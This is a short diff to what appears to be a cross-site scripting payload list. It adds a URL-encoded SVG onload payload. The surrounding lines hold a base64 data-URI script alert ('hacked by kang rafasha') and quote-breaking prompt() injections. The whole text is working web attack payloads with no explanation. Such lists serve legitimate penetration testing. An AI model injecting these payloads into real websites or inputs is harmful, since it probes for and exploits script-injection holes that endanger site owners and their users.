@@ -1,3 +1,4 @@
+%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-search%27%29%3E
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGFja2VkIGJ5IGthbmcgcmFmYXNoYScpPC9zY3JpcHQ+
 "-prompt(8)-"
 '-prompt(8)-'
